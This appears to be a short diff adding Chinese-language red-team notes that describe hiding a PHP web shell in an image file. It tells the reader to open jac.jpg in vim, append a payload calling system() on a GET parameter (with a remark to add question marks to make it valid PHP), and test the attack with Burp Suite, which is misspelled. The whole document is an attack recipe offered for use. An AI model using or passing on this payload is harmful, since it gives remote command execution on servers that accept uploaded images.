@@ -1,0 +1,4 @@
+vim jac.jpg
+在图片末尾加上
+### <php system($_GET['redteamnote']);>(使用的时候前后加上?)
+可以使用Burtsuip进行测试攻击
